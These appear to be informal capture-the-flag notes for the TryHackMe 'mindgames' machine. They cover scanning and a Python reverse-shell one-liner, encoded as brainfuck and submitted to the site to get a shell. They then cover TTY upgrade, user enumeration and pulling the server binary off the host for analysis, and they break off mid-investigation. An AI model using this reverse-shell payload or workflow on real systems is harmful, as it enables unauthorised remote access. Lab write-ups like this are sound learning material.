- running an initial nmap scan i foudn that port 80 and 22 were open
- navigating to the webpage, there were a couple of code snippets to run, the and the coding language was brainfuck
- decoding the brainfuck code samples, i found they were written in python (ex// print('Hello, World')
- i used this python code
```python
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.91.174",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```
- pasted it into a brainfuck code generator, and pasted the generated code into the website
- i got a reverse shell on the site
```
$ whoami
mindgames

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
mindgames@mindgames:~/webserver$
```
- i cded into midngames home directory, which is where user.txt was located
- going up the parent home directory, i found one other user, tryhackme
```
mindgames@mindgames:/home$ ls
mindgames  tryhackme
```
- in order to escalate to root, I would usually use commands such as `sudo -l` but since this is a reverse shell and i don't have a password, we're going to need a different method
- the one hint is to enumerate harder, so i decided against bruteforcing ssh passwords
- instead i cded back into /webserver in mindgames home directory
```
mindgames@mindgames:~/webserver$ ls -la
ls -la
total 7032
drwxrwxr-x 3 mindgames mindgames    4096 May 11  2020 .
drwxr-xr-x 6 mindgames mindgames    4096 May 11  2020 ..
drwxrwxr-x 2 mindgames mindgames    4096 May 11  2020 resources
-rwxrwxr-x 1 mindgames mindgames 7188315 May 11  2020 server
```
- the resources folder contained the index stysheet and js code, all of which are accessible from the webpage itself so I didn't bother investigating those through the shell
- instead i focused on the gigantic server file
```
mindgames@mindgames:~/webserver$ file server
server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, not stripped
```
- yay...
- transfered the files over
```python3
mindgames@mindgames:~/webserver$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

mymachine > wget http://10.10.24.153:8000/server
```
- running file on my attack machine, it showed the build id which seemed a bit unusual
```
└─$ file server
server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=6eWZXU8dxYsVcbX8M-_t/L7HAoBGFkn5le6fY7orV/EsVJ-L3djclt6TZ91pnM/Yqf5bdBbhM5qHpYIoY3Y, not stripped
```
- i used `readelf -a server` to analyze the file further, and found this string at the bottom
```
description data: 36 65 57 5a 58 55 38 64 78 59 73 56 63 62 58 38 4d 2d 5f 74 2f 4c 37 48 41 6f 42 47 46 6b 6e 35 6c 65 36 66 59 37 6f 72 56 2f 45 73 56 4a 2d 4c 33 64 6a 63 6c 74 36 54 5a 39 31 70 6e 4d 2f 59 71 66 35 62 64 42 62 68 4d 35 71 48 70 59 49 6f 59 33 59
```
- decoding it, i found that it was identical to the build id `6eWZXU8dxYsVcbX8M-_t/L7HAoBGFkn5le6fY7orV/EsVJ-L3djclt6TZ91pnM/Yqf5bdBbhM5qHpYIoY3Y`
- 


